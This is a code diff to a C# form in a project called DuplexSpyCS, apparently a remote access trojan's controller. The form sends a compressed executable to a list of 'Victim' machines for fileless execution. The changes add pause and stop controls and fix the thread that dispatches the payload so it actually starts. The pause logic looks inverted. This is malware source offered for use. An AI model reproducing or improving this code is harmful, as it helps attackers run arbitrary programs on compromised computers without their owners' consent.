@@ -33,6 +33,7 @@ namespace DuplexSpyCS
                     .Select(x => (Victim)x.Tag)
                     .ToList()
                     );
+                toolStripStatusLabel2.Text = "Running";
             }));
 
             string szArgs = string.Join(",", alpArgs.Select(x => Crypto.b64E2Str(x)).ToArray());
@@ -42,6 +43,18 @@ namespace DuplexSpyCS
             ThreadPool.SetMaxThreads(nThdCnt, nThdCnt);
             foreach (Victim v in lsTarget)
             {
+                while (m_bSignalPause)
+                {
+                    Invoke(new Action(() => toolStripStatusLabel2.Text = "Pause"));
+                    Thread.Sleep(1000);
+                }
+
+                if (m_bSignalStop)
+                {
+                    Invoke(new Action(() => toolStripStatusLabel2.Text = "Stopped"));
+                    break;
+                }
+
                 ThreadPool.QueueUserWorkItem(x => v.SendCommand($"fle|{szArgs}|{szData}"));
             }
         }
@@ -51,6 +64,9 @@ namespace DuplexSpyCS
             //Controls
             listView1.FullRowSelect = true;
             listView1.CheckBoxes = true;
+            toolStripStatusLabel1.Text = $"Target[{m_lsVictim.Count}]";
+            toolStripStatusLabel2.Text = string.Empty;
+            radioButton1.Checked = true;
 
             //setup
             foreach (Victim v in m_lsVictim)
@@ -65,7 +81,7 @@ namespace DuplexSpyCS
 
         private void frmFilelessExec_Load(object sender, EventArgs e)
         {
-
+            fnSetup();
         }
 
         //Open exe.
@@ -93,6 +109,9 @@ namespace DuplexSpyCS
         //Go
         private void button4_Click(object sender, EventArgs e)
         {
+            m_bSignalPause = false;
+            m_bSignalStop = false;
+
             string szFileName = textBox1.Text;
             string szArgs = textBox2.Text;
 
@@ -107,17 +126,33 @@ namespace DuplexSpyCS
             byte[] abData = File.ReadAllBytes(szFileName);
             abData = C1.Compress(abData);
 
-            new Thread(() => fnSendPayload(alpArgs, nThdCnt, abData));
+            new Thread(() => fnSendPayload(alpArgs, nThdCnt, abData)).Start();
         }
         //Pause
         private void button6_Click(object sender, EventArgs e)
         {
-
+            if (button6.Text == "Pause")
+            {
+                m_bSignalPause = false;
+                toolStripStatusLabel2.Text = "Running";
+                button6.Text = "Resume";
+            }
+            else
+            {
+                m_bSignalPause = true;
+                toolStripStatusLabel2.Text = "Pause";
+                button6.Text = "Pause";
+            }
         }
         //Stop
         private void button5_Click(object sender, EventArgs e)
         {
+            m_bSignalStop = true;
+        }
 
+        private void radioButton1_CheckedChanged(object sender, EventArgs e)
+        {
+            groupBox1.Enabled = radioButton1.Checked;
         }
     }
 }
